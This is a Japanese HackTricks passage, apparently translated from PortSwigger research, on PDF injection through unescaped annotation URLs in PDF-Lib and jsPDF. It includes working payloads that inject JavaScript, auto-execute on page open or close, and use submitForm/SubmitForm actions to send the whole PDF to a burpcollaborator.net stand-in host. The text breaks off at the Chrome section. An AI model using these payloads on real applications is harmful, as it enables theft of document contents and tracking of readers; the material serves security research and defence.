<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する。
* **HackTricks**のPRを[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリに提出して、あなたのハッキングのコツを共有する。

</details>


**PDFファイル内で入力が反映されている場合、JavaScriptを実行したりPDFコンテンツを盗むためにPDFデータを注入してみることができます。**

以下の情報は[**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)から取得されました。

## PDF-Lib

この時、私は[PDFLib](https://pdf-lib.js.org)を使用していました。ライブラリを使って注釈を作成し、注釈URIに閉じ括弧を注入できるか試してみました - そして成功しました！注釈コードを生成するために使用したサンプルの脆弱なコードは以下の通りです:

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[完全なコード:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

注入が成功したことをどうやって知ったのでしょうか？PDFは閉じ括弧を注入しない限り正しくレンダリングされます。これは閉じ括弧が文字列から抜け出て無効なPDFコードを引き起こしていることを証明しました。PDFを壊すことは良いことですが、もちろんJavaScriptを実行できることを確認する必要がありました。レンダリングされたPDFコードを見て、出力がFlateDecodeフィルターを使用してエンコードされていることに気づきました。ブロックをデフレートするための小さなスクリプトを書き、注釈セクションの出力は次のようになりました:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

明らかに、注入文字列は閉じ括弧でテキスト境界を閉じており、既存の閉じ括弧が残っているため、PDFが正しくレンダリングされません:

![PDFをロードする際のエラーダイアログを示すスクリーンショット](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

素晴らしい、PDFのレンダリングを壊すことができましたが、次は何でしょうか？JavaScriptを呼び出す注入を考え出す必要がありました - PDF注入のalert(1)です。

XSSベクトルがブラウザの解析に依存するように、PDF注入の悪用可能性もPDFレンダラーに依存することがあります。私はAcrobatをターゲットにすることから始めました。Chromeではベクトルが機能しない可能性が低いと思ったからです。2つのことに気づきました: 1) 追加の注釈アクションを注入できること、および2) 既存の閉じ括弧を修復するとPDFがレンダリングされること。いくつかの実験の後、追加の注釈アクションを注入し、JavaScriptを実行し、閉じ括弧を修復する素敵なペイロードを考え出しました:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

最初に括弧から抜け出し、辞書から抜け出すために>>を使用してから、新しい注釈辞書を開始します。/S/JavaScriptは注釈をJavaScriptベースにし、/JSはJavaScriptが格納されている場所です。括弧内は実際のJavaScriptです。括弧がバランスしていれば、括弧をエスケープする必要はありません。最後に、注釈のタイプを追加し、辞書を完成させ、閉じ括弧を修復します。これはとてもクールでした。JavaScriptを実行する注入を作成できましたが、それが何だというのでしょうか？JavaScriptを実行できますが、DOMにアクセスできないので、クッキーを読むことはできません。それからJamesが現れて、注入からPDFの内容を盗むことを提案しました。PDFの内容を取得する方法を探し始めました。Acrobatでは、ユーザーの操作なしにJavaScriptを使用してフォームを送信できることがわかりました！JavaScript APIの仕様を見ると、基本的な注入を修正し、PDFコードの全内容を外部サーバーにPOSTリクエストとして送信するJavaScriptを追加するのはかなり簡単でした:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

アラートは必要ありません。注入がJavaScriptを実行していることを証明するために追加しました。

次に、JavaScriptを使用せずにPDFの内容を盗むことを楽しんでみました。PDF仕様から、SubmitFormというアクションを使用できることがわかりました。これは以前、Burp Suiteでスキャンチェック用のPDFを構築したときに使用しました。名前が示す通りのことをします。また、辞書内のFlagsエントリを使用して、送信される内容を制御することもできます。Flags辞書キーは単一の整数値を受け入れますが、各個別の設定はバイナリビットによって制御されます。これらの設定を扱う良い方法は、ES6の新しいバイナリリテラルを使用することです。バイナリリテラルは合計14個のフラグがあるため、14ビット長である必要があります。次の例では、すべての設定が無効になっています:`0b00000000000000`

フラグを設定するには、まずそのビット位置を調べる必要があります（[PDF仕様](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000\_2008.pdf)の表237）。この場合、SubmitPDFフラグを設定したいと思います。これは9番目のビットによって制御されるため、右から9ビットを数えるだけです:`0b00000100000000`

これをJavaScriptで評価すると、10進数の値256になります。言い換えると、Flagsエントリを256に設定すると、SubmitPDFフラグが有効になり、フォームを送信するとPDFの内容が送信されるようになります。すると、以前に作成した基本的な注入を使用し、JavaScriptを呼び出す代わりにSubmitFormアクションを呼び出すように変更するだけです:`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

次に、別のPDFライブラリ - [jsPDF](https://parall.ax/products/jspdf) - に私の方法論を適用し、それも脆弱であることがわかりました。このライブラリを悪用するのはかなり楽しかったです。なぜなら、彼らはブラウザで実行できるAPIを持っており、タイプするとリアルタイムでPDFを生成できるからです。私は、PDP-Libライブラリと同様に、注釈URL内の括弧をエスケープするのを忘れていることに気づきました。ここではurlプロパティが脆弱でした:`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//脆弱`

したがって、彼らのAPIを使用してPDFを生成し、urlプロパティにPDFコードを注入しました:

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

私は辞書のtypeエントリと不要なFエントリを削除することでベクトルを縮小しました。そして、既存のものによって閉じられるぶら下がりの括弧を残しました。注入のサイズを縮小することは重要です。なぜなら、注入するWebアプリケーションが許可する文字の量が限られている可能性があるからです。`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

次に、ベクトルをさらに縮小することが可能であることがわかりました！AcrobatはURIとJavaScriptエントリを1つの注釈アクション内に許可し、JavaScriptを喜んで実行します:`/)/S/JavaScript/JS(app.alert(1)`

さらなる研究により、複数の注釈を注入することもできることがわかりました。これは、アクションを注入する代わりに注釈から抜け出し、ドキュメントのどのセクションがクリック可能かを選択するために独自のrect座標を定義できることを意味します。このテクニックを使用することで、ドキュメント全体をクリック可能にすることができました。 `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## インタラクションなしで注釈を実行する

これまでに示したベクトルは、注釈からアクションをアクティブにするためにクリックを必要とします。通常、Jamesは「自動的に実行できますか？」という質問をしました。PDF仕様を調べて、注釈の興味深い機能に気づきました：

「**PV**および**PI**エントリにより、開いているページと見えているページを区別できます。任意の時点で、ビューアアプリケーションでは単一のページのみが開いていると見なされますが、ページレイアウトに応じて、複数のページが見える場合があります。」

辞書にPVエントリを追加すると、注釈はAcrobatで自動的に発火します！それだけでなく、PDFドキュメントが閉じられたときにPCエントリを使用してペイロードを自動的に実行することもできます。攻撃者は、PDFを開いたときと閉じたときにあなたを追跡することができます。

注釈から自動的に実行する方法は次のとおりです:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

PDFを閉じると、この注釈が発火します:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

Acrobatについて多くを語りましたが、PDFium（ChromeのPDFリーダー）はどうでしょうか？Chromeは
